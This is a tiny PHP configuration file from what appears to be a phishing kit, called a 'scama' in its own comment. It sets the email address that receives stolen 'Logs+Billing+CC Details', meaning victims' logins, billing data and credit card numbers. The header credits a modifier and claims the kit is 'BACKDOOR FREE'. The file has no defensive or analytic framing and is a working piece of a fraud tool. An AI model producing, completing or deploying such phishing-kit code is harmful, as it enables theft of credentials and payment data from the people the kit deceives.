<?php

// SPAM INFO
// THIS SCAMA MODIFIED BY CYBER_KOATTA (BACKDOOR FREE)

$to = "cyber_koatta2@gmail.com"; // Logs+Billing+CC Details

?>